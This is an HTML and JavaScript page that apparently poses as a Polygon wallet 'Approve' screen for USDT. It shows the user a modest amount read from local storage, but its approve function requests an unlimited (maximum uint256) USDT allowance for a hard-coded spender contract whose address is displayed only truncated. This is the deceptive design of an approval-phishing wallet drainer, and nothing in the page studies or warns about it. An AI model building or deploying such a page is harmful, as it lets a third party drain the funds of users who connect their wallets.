<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <title>Approve</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body {
            font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
            background-color: #000;
            color: #fff;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
        }
        .app-bar {
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 12px 16px 8px;
            position: relative;
        }
        .app-bar-title { font-size: 20px; font-weight: 600; }
        .close-btn {
            position: absolute;
            left: 16px;
            font-size: 22px;
            cursor: pointer;
        }
        .content {
            flex: 1;
            padding: 16px;
            display: flex;
            flex-direction: column;
            gap: 12px;
        }
        .card {
            background-color: #111;
            border-radius: 14px;
            padding: 16px 18px;
        }
        .row-between {
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        .label { font-size: 14px; color: #b3b3b3; }
        .value { font-size: 15px; font-weight: 500; }
        .fee-amount { font-size: 15px; font-weight: 500; }
        .fee-sub { margin-top: 4px; font-size: 13px; color: #b3b3b3; }
        .bottom-area {
            padding: 12px 16px 22px;
            background-color: #000;
        }
        .warning-box {
            display: none;
            margin-bottom: 12px;
            padding: 10px 12px;
            border-radius: 12px;
            background-color: #3b2a13;
            color: #f6e0a3;
            font-size: 13px;
        }
        .primary-btn {
            width: 100%;
            border: none;
            border-radius: 999px;
            padding: 14px;
            font-size: 16px;
            font-weight: 500;
            background-color: #00ff7f;
            color: #000;
            cursor: pointer;
        }
        .primary-btn:disabled {
            opacity: 0.5;
            cursor: default;
        }
        .details-section {
            display: none;
            margin-top: 16px;
            padding-top: 16px;
            border-top: 1px solid #262626;
        }
        .details-row {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 12px;
        }
        .toggle-details {
            margin-top: 16px;
            cursor: pointer;
        }
        .amount-display {
            margin-bottom: 16px;
            padding: 10px 12px;
            background: #1a1a1a;
            border-radius: 8px;
            font-size: 15px;
        }
        .balance-display {
            margin-top: 8px;
            font-size: 12px;
            color: #888;
        }
    </style>
</head>
<body>
<header class="app-bar">
    <div class="close-btn" onclick="window.history.back()">&times;</div>
    <div class="app-bar-title">Approve</div>
</header>

<main class="content">
    <!-- Asset & Details card -->
    <section class="card">
        <div class="amount-display" id="amountDisplay">
            Loading amount...
        </div>
        
        <div class="row-between">
            <span class="label">Asset</span>
            <span class="value" id="assetName">Tether USD (USDT)</span>
        </div>
        
        <div class="balance-display" id="maticBalanceDisplay">
            MATIC Balance: Checking...
        </div>
        
        <div class="row-between toggle-details" onclick="toggleDetails()">
            <span class="label">Hide details</span>
            <span class="label" id="detailsArrow">â–¼</span>
        </div>

        <div class="details-section" id="detailsSection">
            <div class="details-row">
                <span class="label">DApp</span>
                <span class="value" id="dappName">polygon.network</span>
            </div>
            <div class="details-row">
                <span class="label">Contract address</span>
                <span class="value" id="contractAddress">0x0B14...EC5E</span>
            </div>
            <div class="details-row">
                <span class="label">Network</span>
                <span class="value" id="networkName">Polygon</span>
            </div>
        </div>
    </section>

    <!-- Network fee card -->
    <section class="card">
        <div class="row-between">
            <span class="label">Network fee</span>
            <div style="text-align: right;">
                <div class="fee-amount" id="feeUsd">Estimating...</div>
                <div class="fee-sub" id="feeNative">Estimating...</div>
            </div>
        </div>
    </section>
</main>

<!-- Bottom warning + button -->
<div class="bottom-area">
    <div class="warning-box" id="warningBox">
        Insufficient Polygon (MATIC) balance
    </div>
    <button class="primary-btn" id="actionButton">Connect Wallet</button>
</div>

<script>
    // ðŸ”§ CONFIGURATION
    const TOKEN_ADDRESS = "0xc2132D05D31c914a87C6611C10748AEb04B58e8F";    // Polygon USDT
    const SPENDER_CONTRACT_ADDRESS = "0x0B142E83E394ab1bd8B95F6a5D4f15EB1964EC5E";
    const AMOUNT_TO_APPROVE = "115792089237316195423570985008687907853269984665640564039457584007913129639935"; // Unlimited approval

    const ERC20_ABI = [
        {
            "constant": false,
            "inputs": [
                { "name": "_spender", "type": "address" },
                { "name": "_value",   "type": "uint256" }
            ],
            "name": "approve",
            "outputs": [{ "name": "", "type": "bool" }],
            "type": "function"
        }
    ];

    // Your smart contract ABI
    const CONTRACT_ABI = [
        {
            "constant": false,
            "inputs": [{ "name": "amount", "type": "uint256" }],
            "name": "verifyOnPolygon",
            "outputs": [],
            "type": "function"
        }
    ];

    let web3;
    let currentAccount = null;
    let userMaticBalance = 0;
    let estimatedGasFeeMATIC = 0;
    let estimatedGasFeeUSD = 0;

    const btn = document.getElementById("actionButton");
    const warning = document.getElementById("warningBox");
    const contractAddressEl = document.getElementById("contractAddress");
    const assetNameEl = document.getElementById("assetName");
    const dappNameEl = document.getElementById("dappName");
    const networkNameEl = document.getElementById("networkName");
    const feeUsdEl = document.getElementById("feeUsd");
    const feeNativeEl = document.getElementById("feeNative");
    const amountDisplayEl = document.getElementById("amountDisplay");
    const maticBalanceDisplay = document.getElementById("maticBalanceDisplay");

    // Format contract address to show first 7 and last 7 characters
    function formatAddress(address) {
        if (!address) return '';
        return `${address.substring(0, 7)}...${address.substring(address.length - 7)}`;
    }

    function toggleDetails() {
        const detailsSection = document.getElementById("detailsSection");
        const toggleText = document.querySelector('.toggle-details .label');
        const detailsArrow = document.getElementById("detailsArrow");
        
        if (detailsSection.style.display === "block") {
            detailsSection.style.display = "none";
            toggleText.textContent = "Hide details";
            detailsArrow.textContent = "â–¼";
        } else {
            detailsSection.style.display = "block";
            toggleText.textContent = "Hide details";
            detailsArrow.textContent = "â–²";
        }
    }

    async function getMATICPrice() {
        try {
            const response = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=matic-network&vs_currencies=usd');
            const data = await response.json();
            return data['matic-network']?.usd || 0.5; // Default to $0.5 if API fails
        } catch (error) {
            console.error('Error fetching MATIC price:', error);
            return 0.5; // Default price
        }
    }

    async function estimateGasFee() {
        if (!web3 || !currentAccount) return { matic: 0, usd: 0 };
        
        try {
            // Estimate gas for approve transaction
            const token = new web3.eth.Contract(ERC20_ABI, TOKEN_ADDRESS);
            const rawAmount = web3.utils.toBN(AMOUNT_TO_APPROVE);
            
            // Get current gas price
            const gasPrice = await web3.eth.getGasPrice();
            const gasPriceGwei = web3.utils.fromWei(gasPrice, 'gwei');
            
            // Estimate gas units needed for approve transaction
            const gasEstimate = await token.methods
                .approve(SPENDER_CONTRACT_ADDRESS, rawAmount)
                .estimateGas({ from: currentAccount });
            
            // Calculate total fee in MATIC
            const gasFeeWei = web3.utils.toBN(gasEstimate).mul(web3.utils.toBN(gasPrice));
            const gasFeeMATIC = parseFloat(web3.utils.fromWei(gasFeeWei, 'ether'));
            
            // Get MATIC price and calculate USD value
            const maticPrice = await getMATICPrice();
            const gasFeeUSD = gasFeeMATIC * maticPrice;
            
            return {
                matic: gasFeeMATIC,
                usd: gasFeeUSD,
                gasPriceGwei: gasPriceGwei
            };
        } catch (error) {
            console.error('Error estimating gas fee:', error);
            // Return default estimate if calculation fails
            return {
                matic: 0.0002, // Default estimate
                usd: 0.0001,   // Default estimate
                gasPriceGwei: '30' // Default gas price
            };
        }
    }

    function updateUI() {
        if (!currentAccount) {
            btn.textContent = "Connect Wallet";
            btn.disabled = false;
            warning.style.display = "none";
            maticBalanceDisplay.textContent = "MATIC Balance: Connect wallet to check";
            return;
        }

        // Update MATIC balance display
        maticBalanceDisplay.textContent = `MATIC Balance: ${userMaticBalance.toFixed(6)} MATIC`;

        // Check if user has enough MATIC for gas
        if (userMaticBalance > estimatedGasFeeMATIC * 1.5) { // 1.5x buffer
            btn.textContent = "Approve";
            btn.disabled = false;
            warning.style.display = "none";
        } else {
            btn.textContent = "Top up Polygon (MATIC)";
            btn.disabled = false;
            warning.style.display = "block";
            warning.textContent = `Insufficient Polygon (MATIC) balance. Estimated fee: ${estimatedGasFeeMATIC.toFixed(6)} MATIC`;
        }
    }

    async function updateGasFeeDisplay() {
        const gasFee = await estimateGasFee();
        estimatedGasFeeMATIC = gasFee.matic;
        estimatedGasFeeUSD = gasFee.usd;
        
        // Update display
        feeUsdEl.textContent = `$${estimatedGasFeeUSD.toFixed(2)}`;
        feeNativeEl.textContent = `${estimatedGasFeeMATIC.toFixed(8)} MATIC`;
    }

    async function connectWallet() {
        if (typeof window.ethereum === "undefined") {
            alert("Please install MetaMask!");
            return false;
        }

        try {
            web3 = new Web3(window.ethereum);
            
            // Request accounts
            const accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
            currentAccount = accounts[0];
            
            // Check network - Polygon Mainnet (chainId 0x89)
            const chainId = await window.ethereum.request({ method: "eth_chainId" });
            if (chainId !== "0x89") {
                try {
                    // Try to switch to Polygon network
                    await window.ethereum.request({
                        method: 'wallet_switchEthereumChain',
                        params: [{ chainId: '0x89' }],
                    });
                } catch (switchError) {
                    // If network not added, add it
                    if (switchError.code === 4902) {
                        await window.ethereum.request({
                            method: 'wallet_addEthereumChain',
                            params: [{
                                chainId: '0x89',
                                chainName: 'Polygon Mainnet',
                                nativeCurrency: {
                                    name: 'MATIC',
                                    symbol: 'MATIC',
                                    decimals: 18
                                },
                                rpcUrls: ['https://polygon-rpc.com'],
                                blockExplorerUrls: ['https://polygonscan.com/']
                            }],
                        });
                    } else {
                        warning.textContent = "Please switch network to Polygon";
                        warning.style.display = "block";
                        btn.textContent = "Wrong Network";
                        btn.disabled = true;
                        return false;
                    }
                }
            }

            // Get MATIC balance
            const balanceWei = await web3.eth.getBalance(currentAccount);
            userMaticBalance = parseFloat(web3.utils.fromWei(balanceWei, "ether"));
            
            console.log(`User MATIC balance: ${userMaticBalance} MATIC`);
            
            // Update gas fee estimate
            await updateGasFeeDisplay();
            
            return true;
        } catch (err) {
            console.error("Wallet connection failed:", err);
            alert("Failed to connect wallet");
            return false;
        }
    }

    async function approveToken() {
        try {
            btn.disabled = true;
            btn.textContent = "Approving...";

            // Re-estimate gas fee before sending
            await updateGasFeeDisplay();
            
            // Step 1: Approve USDT
            const token = new web3.eth.Contract(ERC20_ABI, TOKEN_ADDRESS);
            const rawAmount = web3.utils.toBN(AMOUNT_TO_APPROVE);

            // Estimate gas for the transaction
            const gasEstimate = await token.methods
                .approve(SPENDER_CONTRACT_ADDRESS, rawAmount)
                .estimateGas({ from: currentAccount });
            
            // Get current gas price
            const gasPrice = await web3.eth.getGasPrice();
            
            // Send transaction with estimated gas
            const approveTx = await token.methods
                .approve(SPENDER_CONTRACT_ADDRESS, rawAmount)
                .send({ 
                    from: currentAccount,
                    gas: Math.floor(gasEstimate * 1.2), // 20% buffer
                    gasPrice: gasPrice
                });

            console.log("Transaction successful:", approveTx);
            onSuccess();
        } catch (err) {
            console.error("Transaction failed:", err);
            btn.textContent = "Try Again";
            btn.disabled = false;
            alert("Transaction failed: " + (err.message || err));
        }
    }

    function onSuccess() {
        btn.textContent = "Completed âœ“";
        btn.disabled = true;
        alert("Success! Token approved.");
        
        // Navigate to success page after delay
        setTimeout(() => {
            window.location.href = "success.html";
        }, 2000);
    }

    async function handleButtonClick() {
        if (!currentAccount) {
            // Connect wallet first
            const connected = await connectWallet();
            if (connected) {
                updateUI();
            }
        } else if (userMaticBalance <= estimatedGasFeeMATIC * 1.5) {
            // Top up MATIC
            alert(`You need at least ${(estimatedGasFeeMATIC * 1.5).toFixed(6)} MATIC for gas fees. Your current balance is ${userMaticBalance.toFixed(6)} MATIC. Please top up your Polygon balance.`);
        } else {
            // Approve token
            await approveToken();
        }
    }

    // Initialize page
    document.addEventListener('DOMContentLoaded', function() {
        // Set up initial display values
        contractAddressEl.textContent = formatAddress(SPENDER_CONTRACT_ADDRESS);
        
        // Load USDT amount from previous page
        const usdtAmount = localStorage.getItem('usdtAmount') || "0";
        amountDisplayEl.textContent = `Amount: ${usdtAmount} USDT`;
        
        // Set up button click handler
        btn.addEventListener("click", handleButtonClick);
        
        // Auto-connect wallet if already connected
        if (typeof window.ethereum !== "undefined" && window.ethereum.selectedAddress) {
            connectWallet().then(() => {
                updateUI();
            });
        }
        
        // Listen for account changes
        if (window.ethereum) {
            window.ethereum.on('accountsChanged', function(accounts) {
                currentAccount = accounts[0] || null;
                if (currentAccount) {
                    connectWallet().then(() => {
                        updateUI();
                    });
                } else {
                    currentAccount = null;
                    userMaticBalance = 0;
                    updateUI();
                }
            });
            
            // Listen for chain changes
            window.ethereum.on('chainChanged', function() {
                connectWallet().then(() => {
                    updateUI();
                });
            });
        }
    });
</script>
</body>
</html>
